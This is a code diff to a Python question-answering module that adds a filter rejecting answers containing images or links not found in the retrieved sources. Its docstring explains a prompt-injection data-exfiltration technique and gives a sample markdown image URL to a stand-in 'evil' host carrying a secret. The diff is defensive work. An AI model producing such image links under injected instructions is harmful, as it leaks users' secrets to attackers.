@@ -63,6 +63,24 @@ class Answer:
 
 
 _MARKER = re.compile(r"\[(S\d+)\]")
+_IMAGE = re.compile(r"!\[[^\]]*\]\(|<img\b", re.IGNORECASE)
+_URL = re.compile(r"https?://[^\s)>\]\"']+", re.IGNORECASE)
+
+
+def unsafe_output(text: str, sources: dict[str, Source]) -> str | None:
+    """A reason the answer must not be shown, else None.
+
+    Images and unknown links are how an injected instruction smuggles data out: the client renders
+    `![x](https://evil/?q=<secret>)` and the browser sends the secret. An answer may contain a link
+    only if that exact link already appears in a source we retrieved.
+    """
+    if _IMAGE.search(text):
+        return "the answer contains an image, which is never allowed"
+    known = " ".join(s.text for s in sources.values())
+    for url in _URL.findall(text):
+        if url.rstrip(".,;:") not in known:
+            return f"the answer contains a link that is not in the sources: {url[:60]}"
+    return None
 
 
 def _parse(text: str) -> AnswerPayload:
@@ -89,6 +107,8 @@ def _check(payload: AnswerPayload, sources: dict[str, Source]) -> None:
         )
     if not payload.citations and not markers:
         raise ValueError("a supported answer must cite at least one source like [S1]")
+    if reason := unsafe_output(payload.answer, sources):
+        raise ValueError(reason)
 
 
 def answer_question(
@@ -240,7 +260,7 @@ def answer_stream(
         return
     text = result.text.strip()
     markers = list(dict.fromkeys(_MARKER.findall(text)))
-    if markers and all(m in sources for m in markers):
+    if markers and all(m in sources for m in markers) and unsafe_output(text, sources) is None:
         spent.text, spent.refused, spent.reason = text, False, ""
         spent.citations = [
             Citation(s.id, s.document, s.section, s.pages, s.anchors, s.chunk_id)
